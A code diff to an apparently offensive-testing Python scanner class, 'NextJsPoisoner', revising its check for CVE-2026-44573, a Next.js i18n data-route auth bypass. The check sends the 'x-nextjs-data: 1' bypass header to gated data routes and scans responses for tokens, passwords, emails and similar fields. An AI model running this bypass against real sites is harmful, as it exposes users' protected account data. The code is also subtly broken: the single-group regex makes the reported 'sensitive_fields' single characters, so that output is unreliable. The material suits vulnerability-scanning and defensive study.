@@ -18,6 +18,7 @@ References:
 - https://github.com/dwisiswant0/next-16.2.4-pocs
 """
 
+import re
 import time
 import uuid
 import random
@@ -444,7 +445,6 @@ class NextJsPoisoner:
             resp_body = str(resp.get("body", b""))
             resp_headers_str = str(resp.get("headers", {}))
 
-            import re
             rsc_matches = re.findall(r'[?&]_rsc=([a-zA-Z0-9]+)', resp_body + resp_headers_str)
             rsc_values.update(rsc_matches)
 
@@ -465,13 +465,29 @@ class NextJsPoisoner:
 
         return None
 
+    # Sensitive field patterns that indicate server-side auth-protected data
+    _SENSITIVE_PROPS = re.compile(
+        r'"(user|session|token|auth|email|password|secret|api_?key|bearer|role|'
+        r'permissions?|account|profile|subscription|billing|ssn|dob|address|phone)'
+        r'"\s*:\s*"[^"]{3,}"',
+        re.IGNORECASE,
+    )
+
     async def _i18n_data_route_bypass(self, client: HttpClient) -> Optional[Dict]:
         """
         CVE-2026-44573: i18n data-route bypass.
 
         Pages Router with i18n: requesting /_next/data/<buildId>/page.json
         without locale prefix bypasses middleware auth. Combined with
-        x-nextjs-data: 1 for full bypass. Cached response exposes sensitive data.
+        x-nextjs-data: 1 for full bypass.
+
+        A finding is only raised when ALL of the following are true:
+        1. The site has i18n configured (locale patterns detected in HTML).
+        2. The data-route with x-nextjs-data is reachable AND returns 200.
+        3. The same data-route WITHOUT the header returns 401/403/307 (i.e., access
+           was previously gated — proving this is a real bypass, not just a public
+           endpoint).
+        4. The response body contains field patterns typical of auth-protected data.
         """
         scheme_host = f"{self._parsed.scheme}://{self._parsed.netloc}"
 
@@ -479,8 +495,26 @@ class NextJsPoisoner:
         if not first_resp:
             return None
 
-        body_str = str(first_resp.get("body", b""))
-        import re
+        body_str = (
+            first_resp.get("body", b"").decode("utf-8", errors="replace")
+            if isinstance(first_resp.get("body"), bytes)
+            else str(first_resp.get("body", ""))
+        )
+
+        # Step 1: Verify i18n is configured — look for locale signals in the HTML.
+        # Sites without i18n won't have these patterns; public /_next/data/ access
+        # is normal and not a vulnerability.
+        i18n_signals = re.findall(
+            r'"locales"\s*:\s*\[([^\]]+)\]'           # "__NEXT_DATA__".locales
+            r'|"locale"\s*:\s*"([a-zA-Z]{2,5})"'      # current locale field
+            r'|href="/([a-zA-Z]{2,5})/'                # locale-prefixed hrefs
+            r'|<link[^>]+hreflang="([a-zA-Z]{2,5})"', # hreflang attributes
+            body_str,
+        )
+        if not i18n_signals:
+            logger.debug("CVE-2026-44573: skipping — no i18n configuration detected on target")
+            return None
+
         build_id_match = re.search(r'"buildId"\s*:\s*"([a-zA-Z0-9_-]+)"', body_str)
         if not build_id_match:
             build_id_match = re.search(r'/_next/data/([a-zA-Z0-9_-]+)/', body_str)
@@ -496,29 +530,67 @@ class NextJsPoisoner:
         cache_buster = f"cb={int(time.time())}_{random.randint(1000, 9999)}"
         target_url = f"{data_url}?{cache_buster}"
 
-        headers = {**self.safe_headers, "x-nextjs-data": "1"}
+        # Step 2: Try WITHOUT the bypass header first — establish that this route
+        # would normally be gated (returns 401/403/307 to redirect to login).
+        baseline_data_resp = await client.request("GET", target_url, headers=self.safe_headers)
+        if not baseline_data_resp:
+            return None
 
-        resp = await client.request("GET", target_url, headers=headers)
+        normal_status = baseline_data_resp["status"]
+        gated_statuses = {401, 403, 307, 302, 308}
+        if normal_status not in gated_statuses:
+            # Route is publicly accessible without header — not a bypass, just a
+            # normal public Next.js data endpoint.
+            logger.debug(
+                f"CVE-2026-44573: skipping — data route returned {normal_status} "
+                f"without bypass header (not gated)"
+            )
+            return None
+
+        # Step 3: Now try WITH the bypass header.
+        headers = {**self.safe_headers, "x-nextjs-data": "1"}
+        cb2 = f"cb={int(time.time())}_{random.randint(1000, 9999)}"
+        bypass_url = f"{data_url}?{cb2}"
+        resp = await client.request("GET", bypass_url, headers=headers)
+
         if not resp or resp["status"] != 200:
             return None
 
         resp_ct = resp.get("headers", {}).get("Content-Type", "")
-        if "json" in resp_ct:
-            resp_body = str(resp.get("body", b""))
-            if "pageProps" in resp_body or "props" in resp_body:
-                return self._make_finding(
-                    "NextJS-i18n-DataRouteBypass",
-                    "HIGH",
-                    f"CVE-2026-44573: i18n data-route bypass returned pageProps JSON "
-                    f"without locale prefix. Middleware auth may be bypassed. "
-                    f"Cached response exposes server-side props to all users.",
-                    {"name": "CVE-2026-44573", "header": "x-nextjs-data", "value": "1"},
-                    target_url,
-                    cve="CVE-2026-44573",
-                    build_id=build_id,
-                )
+        if "json" not in resp_ct:
+            return None
 
-        return None
+        # Step 4: Confirm the response contains auth-protected field patterns.
+        resp_body = (
+            resp.get("body", b"").decode("utf-8", errors="replace")
+            if isinstance(resp.get("body"), bytes)
+            else str(resp.get("body", ""))
+        )
+
+        sensitive_matches = self._SENSITIVE_PROPS.findall(resp_body)
+        if not sensitive_matches:
+            logger.debug(
+                "CVE-2026-44573: data route accessible with bypass header but "
+                "response contains no sensitive field patterns — skipping"
+            )
+            return None
+
+        is_hit, evidence = CacheGuard.cache_hit_signal(resp)
+        return self._make_finding(
+            "NextJS-i18n-DataRouteBypass",
+            "CRITICAL" if is_hit else "HIGH",
+            f"CVE-2026-44573: i18n data-route bypass confirmed. "
+            f"Route {data_url!r} returned HTTP {normal_status} without bypass header "
+            f"but HTTP 200 with x-nextjs-data: 1, exposing auth-protected pageProps "
+            f"({len(sensitive_matches)} sensitive field(s) detected).",
+            {"name": "CVE-2026-44573", "header": "x-nextjs-data", "value": "1"},
+            bypass_url,
+            cve="CVE-2026-44573",
+            build_id=build_id,
+            normal_status=normal_status,
+            sensitive_fields=[m[0] or m[1] or m[2] or m[3] for m in sensitive_matches][:5],
+            cache_evidence=evidence,
+        )
 
     def _add_cb(self, url: str, cb: str) -> str:
         return f"{url}?{cb}" if "?" not in url else f"{url}&{cb}"
